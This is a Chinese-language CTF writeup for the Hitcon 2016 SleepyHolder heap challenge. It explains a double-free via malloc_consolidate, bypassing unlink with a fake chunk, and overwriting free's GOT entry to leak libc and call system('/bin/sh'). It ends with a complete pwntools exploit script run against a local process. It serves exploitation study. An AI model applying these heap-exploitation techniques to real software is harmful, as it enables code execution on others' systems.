---
title: how2heap writeup
description: 
categories:
tags: 
grammar_cjkRuby: true
---


### Hitcon 2016 SleepyHolder
1. 题目的漏洞是可以 double free

![doublefree](https://www.github.com/Byzero512/blog_img/raw/master/1538372886367.png)

2. 但是这道题目最特别的地方在于: 最多只有三个chunk,每一个chunk大小不一样,而且有一个是 mmap chunk
> 我们并不能直接使用 double free, 而是先 fast_dup_consolidate, 实现double free: 结果是 同一个chunk会同时出现在 fastbin 和 smallbin, 为 uaf漏洞
> 光靠uaf无法达到利用, 要再加上unlink利用.

#### 利用流程

1. malloc fastbin
2. malloc largebin(防止free fastbin的时候fastbin与topchunk合并)
3. free fastbin
4. malloc mmap_largechunk(调用malloc consolidate, 结果是之前free的fastchunk出现在smallbin)
5. free fastbin(达成double free)
6. malloc fastbin(注意这里的payload要能够绕过unlink)
7. free largebin(第二步malloc出来的), 这时会unlink前面那一个
8. 利用unlink之后我们就可以控制全局指针段
9. 改 free_got-->puts_plt
10. leak puts_got, 然后 leak 出system
11. 改 free_got --> system
12. 设置好 '/bin/sh\x00' 的位置

> 难点在于绕过unlink:
我们在fastchunk中伪造一个小fastchunk,并设置好它的指针指向bss段中合适的位置,即可绕过并且利用unlink

#### exp
```python
p=process('./SleepyHolder')
context.log_level='debug'
context.arch='amd64'
gdb.attach(p)

e=ELF('./SleepyHolder')
free_got=e.got['free']
puts_plt=e.plt['puts']      ## ba free_got change to puts 
puts_got=e.got['puts']

def newsmall(payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recv()
	p.sendline('1')
	p.recvuntil('Tell me your secret: \n')
	p.sendline(payload)

def newbig(payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recv()
	p.sendline('2')
	p.recvuntil('Tell me your secret: \n')
	p.sendline(payload)
def newhuge(payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recvuntil('3. Keep a huge secret and lock it forever\n')
	p.sendline('3')
	p.recvuntil('Tell me your secret: \n')
	p.sendline(payload)

def deletesmall():
	p.recvuntil('3. Renew secret\n')
	p.sendline('2')
	p.recv()
	p.sendline('1')

def deletebig():
	p.recvuntil('3. Renew secret\n')
	p.sendline('2')
	p.recv()
	p.sendline('2')
	

def renew(choice,payload):
	p.recvuntil('3. Renew secret\n')
	p.sendline('3')
	p.recv()
	p.sendline(str(choice))
	p.recvuntil('Tell me your secret: \n')
	p.send(payload)


newsmall('\x00\x00\x00')
newbig('\x00\x00\x00')
deletesmall()
newhuge('\x00\x00\x00')

deletesmall()        # double free: fastbin and small bin

payload=('\x00'*0x8+p64(0x21)+p64(0x6020D0-0x18)+p64(0x6020D0-0x10))+p64(0x20)
newsmall(payload)
deletebig()                # then the fast_chunk_ptr point to the position nearby it 

newbig('big_secret')           

payload=p64(0)+p64(free_got)        # change glo_ptr --> free_got
renew(1,payload)
renew(2,p64(puts_plt))              # change free_got --> puts_plt

payload=p64(0)+p64(puts_got)
renew(1,payload)
deletebig()                  

puts_libc=u64(p.recvuntil('1')[0:6].ljust(8,'\x00'))
puts_off=456336
sys_off=283536
system=puts_libc-puts_off+sys_off

newbig('123456')
payload=p64(0)+p64(free_got)
renew(1,payload)
renew(2,p64(system))             


payload=('/bin/sh\x00').ljust(8,'\x00')+p64(0x6020b8)
renew(1,payload)

deletebig()

p.interactive()

```


